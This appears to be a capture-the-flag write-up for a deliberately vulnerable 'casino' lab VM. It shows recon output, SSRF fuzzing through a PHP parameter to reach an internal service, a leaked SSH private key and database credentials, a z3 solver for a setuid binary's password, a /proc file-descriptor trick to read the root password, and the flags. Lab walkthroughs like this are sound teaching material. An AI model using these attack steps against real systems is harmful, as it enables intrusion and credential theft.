brief `enjoy ;)`

TARGET_IP = `192.168.0.120`
# recon 

```d
#nmap 

open ports 
22,80 

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 3b20d0bae27a8a018a353b5208b0c6a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBChkxiydL7VU9KRiEhoRJa91lEFMFf75/O3kmwYteXO/HUkDV26I/htK65FAfkPVmJt1+y1P6s7o32+49ah0wIg=
|   256 74760a61d42c9b4536004dc8d8be0b89 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHtfI395w+LZm/DiPb0vU6ZTTZN/qVfVgGjEwH9IWY1e
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Binary Bet Casino
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:C4:66:29 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:34
Completed NSE at 01:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:34
Completed NSE at 01:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:34
Completed NSE at 01:34, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.79 seconds

```

more recon site 

```d 
# dirsearch 

[01:38:47] 200 -    0B  - /config.php
[01:38:55] 200 -  363B  - /database.sql
[01:39:42] 301 -  305B  - /js  ->  http://casino.hmv/js/
[01:39:42] 200 -  469B  - /js/
[01:39:51] 302 -    0B  - /logout.php  ->  /index.php
[01:40:45] 200 -  466B  - /register.php
[01:40:49] 200 -   12B  - /robots.txt
[01:40:55] 403 -  275B  - /server-status
[01:40:55] 403 -  275B  - /server-status/
/index.php            (Status: 200) [Size: 1138]
/register.php         (Status: 200) [Size: 1347]
/template.html        (Status: 200) [Size: 1170]
/imgs                 (Status: 301) [Size: 307] [--> http://casino.hmv/imgs/]
/js                   (Status: 301) [Size: 305] [--> http://casino.hmv/js/]  
/logout.php           (Status: 302) [Size: 0] [--> /index.php]               
/config.php           (Status: 200) [Size: 0]                                
/casino               (Status: 301) [Size: 309] [--> http://casino.hmv/casino/]
/styles               (Status: 301) [Size: 309] [--> http://casino.hmv/styles/]
/robots.txt           (Status: 200) [Size: 12]                                 
/restricted.php
```

robots.txt says good luck, get the database.sql 

```sql 
└──╼ $cat database.sql 
CREATE USER 'casino_admin'@'localhost' IDENTIFIED BY 'IJustWantToBeRichBaby420';
CREATE DATABASE IF NOT EXISTS casino;
GRANT ALL PRIVILEGES ON casino.* TO 'casino_admin'@'localhost';
FLUSH PRIVILEGES;

USE casino;
CREATE TABLE users (
  id INT PRIMARY KEY AUTO_INCREMENT,
  user VARCHAR(50) NOT NULL,
  pass VARCHAR(255) NOT NULL,
  money INT UNSIGNED NOT NULL
);
```

seems we got username and password 

```d
/js/games.js 
function play_game(num) {
    window.location="./games.php?game="+num;
}


```

```d 
┌─[m1cr0@veric]─[~/Desktop/HMV/casino]
└──╼ $gobuster fuzz -u "http://casino.hmv/casino/explainmepls.php?learnabout=127.0.0.1:FUZZ" -w ports.txt -c "PHPSESSID=7q750fcoe55fsvp5594npoehhm" -a "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0"  --exclude-length 1137 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://casino.hmv/casino/explainmepls.php?learnabout=127.0.0.1:FUZZ
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         ports.txt
[+] Exclude Length:   1137
[+] Cookies:          PHPSESSID=7q750fcoe55fsvp5594npoehhm
[+] User Agent:       Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
[+] Timeout:          10s
===============================================================
2024/08/23 07:55:47 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=2275] http://casino.hmv/casino/explainmepls.php?learnabout=127.0.0.1:0
Found: [Status=200] [Length=2275] http://casino.hmv/casino/explainmepls.php?learnabout=127.0.0.1:80
Found: [Status=200] [Length=1976] http://casino.hmv/casino/explainmepls.php?learnabout=127.0.0.1:6969

```


```d
─[m1cr0@veric]─[~/Desktop/HMV/casino]
└──╼ $gobuster fuzz -u "http://casino.hmv/casino/explainmepls.php?learnabout=127.0.0.1:6969/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -c "PHPSESSID=7q750fcoe55fsvp5594npoehhm" -a "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0" --exclude-length 1137
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://casino.hmv/casino/explainmepls.php?learnabout=127.0.0.1:6969/FUZZ
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Exclude Length:   1137
[+] Cookies:          PHPSESSID=7q750fcoe55fsvp5594npoehhm
[+] User Agent:       Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
[+] Timeout:          10s
===============================================================
2024/08/23 08:07:22 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=1414] http://casino.hmv/casino/explainmepls.php?learnabout=127.0.0.1:6969/codebreakers
Found: [Status=400] [Length=301] http://casino.hmv/casino/explainmepls.php?learnabout=127.0.0.1:6969/video games  
Found: [Status=400] [Length=301] http://casino.hmv/casino/explainmepls.php?learnabout=127.0.0.1:6969/cable tv     
Found: [Status=400] [Length=301] http://casino.hmv/casino/explainmepls.php?learnabout=127.0.0.1:6969/cell phones  
Found: [Status=400] [Length=301] http://casino.hmv/casino/explainmepls.php?learnabout=127.0.0.1:6969/long distance
Found: [Status=400] [Length=301] http://casino.hmv/casino/explainmepls.php?learnabout=127.0.0.1:6969/nero 7       
Found: [Status=400] [Length=301] http://casino.hmv/casino/explainmepls.php?learnabout=127.0.0.1:6969/spyware doctor
Found: [Status=400] [Length=301] http://casino.hmv/casino/explainmepls.php?learnabout=127.0.0.1:6969/Fall Out Boy - From Under The Cork Tree
Found: [Status=400] [Length=301] http://casino.hmv/casino/explainmepls.php?learnabout=127.0.0.1:6969/Michael Jackson - Thriller             

```

found shimeer_rsa key 

```d
<html>

<head>
    <meta charset="UTF-8" />
    <title>Binary Bet Casino</title>
    <!--By LordP4 <3 -->
    <link rel="stylesheet" href="[../styles/general.css](view-source:http://casino.hmv/styles/general.css)" />
    <link rel="stylesheet" href="[../styles/casino.css](view-source:http://casino.hmv/styles/casino.css)" />
</head>

<body>
    <div class="container">
        <main class="main">
            
<script>
    function logout() {
        sessionStorage.clear();
        localStorage.clear();
        window.location.href = "/logout.php";
    }
    function menu() {
        window.location.href = "/casino/index.php";
    }
</script>

<div>
    <button class="head_buttom" onclick="menu()">Games</button>
</div>
<div>
    <h2>Welcome casino_admin</h1>
        <div>
            <p>Current money: 0$</p>
        </div>
</div>
<div>
    <button class="head_buttom" onclick="logout()">Log out</button>
</div>        </main>

        <h1>LEARN HOW TO PLAY FIRST ;)</h1>

        <div id="games">
            <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    Pls Shimmer, dont f*ck this up again...
    <a href="[./shimmer_rsa](view-source:http://casino.hmv/casino/shimmer_rsa)"></a>
</body>
</html>        </div>
```

got username shimmer and rsa 
`http://casino.hmv/casino/explainmepls.php?learnabout=127.0.0.1:6969/codebreakers/shimmer_rsa`

```d 
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
-----END OPENSSH PRIVATE KEY-----
```


login 

```d 
┌─[m1cr0@veric]─[~/Desktop/HMV/casino]
└──╼ $chmod 600 shit_rsa 
┌─[m1cr0@veric]─[~/Desktop/HMV/casino]
└──╼ $ssh shimmer@casino.hmv -i shit_rsa 
The authenticity of host 'casino.hmv (192.168.0.120)' can't be established.
ECDSA key fingerprint is SHA256:Alo4fePBm5MJP0/kY7pUxpwaFAZzwolXPDk7+dfER6w.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/home/m1cr0/.ssh/known_hosts).
Debian GNU/Linux 12
Welcome to Binary Bet Casino
--------------------------------
Linux casino 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun 14 17:24:28 2023 from 192.168.1.71
shimmer@casino:~$ ls -la
total 48
drwx------ 3 shimmer shimmer  4096 Jun 14  2023 .
drwxr-xr-x 4 root    root     4096 Jun 14  2023 ..
lrwxrwxrwx 1 shimmer shimmer     9 Jun 14  2023 .bash_history -> /dev/null
-rw-r--r-- 1 shimmer shimmer   220 Jun 14  2023 .bash_logout
-rw-r--r-- 1 shimmer shimmer  3526 Jun 14  2023 .bashrc
-rw-r--r-- 1 shimmer shimmer   807 Jun 14  2023 .profile
drwx------ 2 shimmer shimmer  4096 Jun 14  2023 .ssh
-rwsr-xr-x 1 root    root    16432 Jun 14  2023 pass
-rw-r--r-- 1 root    root       17 Jun 14  2023 user.txt
shimmer@casino:~$ 

```

# privi 

get pass file 
```python
from z3 import *

  

# Create 26 variables, each variable represents the ASCII value of the character at the corresponding position in the string

a = [Int('a[%d]' % i) for i in range(26)]

  

# Create a Z3 solver instance

solver = Solver()

  

# List of constraints

constraints = [

a[0] - a[20] == -10,

a[6] + a[1] == 200,

a[2] - a[4] == 10,

a[3] - a[14] == -2,

a[25] * a[4] == 10100,

a[17] + a[5] == 219,

a[6] - a[10] == -11,

a[7] - a[20] == -10,

a[8] * a[17] == 11845,

a[9] - a[18] == -7,

a[10] - a[24] == 1,

a[11] * a[4] == 9797,

a[12] - a[3] == 3,

a[13] * a[11] == 11252,

a[14] - a[13] == -2,

a[15] == a[23],

a[16] - a[8] == -5,

a[17] * a[7] == 10815,

a[18] - a[14] == -2,

a[19] - a[0] == -8,

a[20] - a[23] == 4,

a[21] + a[7] == 220,

a[22] - a[1] == 15,

a[23] == a[15],

a[24] * a[2] == 12654,

a[25] - a[12] == -15

]

  

# Add constraints

for constraint in constraints:

solver.add(constraint)

  

# Ensure each variable is within the ASCII range for printable characters

for i in range(26):

solver.add(a[i] >= 32, a[i] <= 126)

  

# Check whether constraints are satisfied

if solver.check() == sat:

model = solver.model()

result = ''.join([chr(model[a[i]].as_long()) for i in range(26)])

print("Result: ", result)

else:

print("No solution found")

  
  

# FIRST PASSWORD : ihopethisisastrongpassword

# SECOND PASSWD : ultrasecretpassword
```

cd /proc
$ cd self

```sql
$ cat <&3
masteradmin420
$ su root
Password: 
root@casino:/proc/1257# cd /root
root@casino:~# ls
r0ot.txt
root@casino:~# cat r0ot.txt 
symboliclove4u
root@casino:~# 

```
